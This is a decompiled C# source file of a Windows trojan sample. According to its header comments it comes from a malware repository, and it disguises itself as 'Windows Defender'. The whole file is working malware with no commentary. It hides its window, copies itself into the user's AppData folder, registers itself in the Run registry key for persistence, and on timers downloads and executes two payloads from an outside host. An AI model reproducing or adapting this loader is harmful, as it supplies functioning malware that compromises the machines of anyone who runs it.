// Decompiled with JetBrains decompiler
// Type: Project_Silent.Form1
// Assembly: Windows Defender, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A5A4E042-72FC-45F8-9896-F9BC447F43ED
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.mjg-8420e001d394b4d906078a63a83b83515d07dc88ad9501aa8ce0d3c75d53be85.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Project_Silent.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace Project_Silent
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("Timer1")]
    private Timer _Timer1;
    [AccessedThroughProperty("Timer2")]
    private Timer _Timer2;
    private string[] UserName;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    [DebuggerNonUserCode]
    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      Form1.__ENCAddToList((object) this);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (Form1.__ENCList)
      {
        if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (Form1.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (Form1.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Form1.__ENCList[index1] = Form1.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
          Form1.__ENCList.Capacity = Form1.__ENCList.Count;
        }
        Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.Timer1 = new Timer(this.components);
      this.Timer2 = new Timer(this.components);
      this.SuspendLayout();
      this.Timer1.Enabled = true;
      this.Timer1.Interval = 30000;
      this.Timer2.Interval = 1800000;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(10, 10);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.WindowState = FormWindowState.Minimized;
      this.ResumeLayout(false);
    }

    internal virtual Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual Timer Timer2
    {
      [DebuggerNonUserCode] get => this._Timer2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer2_Tick);
        if (this._Timer2 != null)
          this._Timer2.Tick -= eventHandler;
        this._Timer2 = value;
        if (this._Timer2 == null)
          return;
        this._Timer2.Tick += eventHandler;
      }
    }

    private void DownloadAndRun(string exeUrl)
    {
      string str = Path.GetTempFileName() + ".exe";
      MyProject.Computer.Network.DownloadFile(exeUrl, str);
      Process.Start(str);
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      this.DownloadAndRun("http://www.styro1337.com/WinDefender.exe");
      this.DownloadAndRun("http://www.styro1337.com/WinDefender1.exe");
      this.Timer2.Start();
      this.Timer1.Stop();
    }

    private void Timer2_Tick(object sender, EventArgs e)
    {
      this.DownloadAndRun("http://www.styro1337.com/WinDefender.exe");
      this.DownloadAndRun("http://www.styro1337.com/WinDefender1.exe");
    }

    public static void AddStartup(string Name, string Path) => Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(Name, (object) Path, RegistryValueKind.String);

    private void Form1_Load(object sender, EventArgs e)
    {
      this.UserName = MyProject.User.Name.Split('\\');
      string str = "C:\\Users\\" + this.UserName[1] + "\\AppData\\Roaming";
      if (Operators.CompareString(Application.StartupPath, str, false) != 0)
      {
        if (!Directory.Exists(str))
          Directory.CreateDirectory(str);
        if (!File.Exists(str + "\\Autotalker.exe"))
          File.Copy(Application.ExecutablePath, str + "\\Autotalker.exe");
        Process.Start(str + "\\Autotalker.exe");
        this.Close();
        Application.Exit();
      }
      Form1.AddStartup(this.Text, Application.ExecutablePath);
    }
  }
}
